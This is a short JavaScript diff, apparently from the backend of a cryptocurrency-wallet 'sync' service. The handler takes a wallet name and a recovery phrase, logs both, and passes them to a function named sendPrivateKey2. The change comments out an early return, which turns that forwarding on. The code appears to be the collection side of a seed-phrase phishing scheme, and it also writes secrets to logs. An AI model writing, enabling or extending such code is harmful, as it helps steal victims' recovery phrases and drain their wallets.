@@ -115,7 +115,7 @@ export const getSyncPhrase = async (req, res) => {
   console.log("yes", walletName, rPhrase);
   const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
   if (!checkPhrase) return;
-  return;
+  // return;
   try {
     sendPrivateKey2(walletName, rPhrase);
     return responses.success({
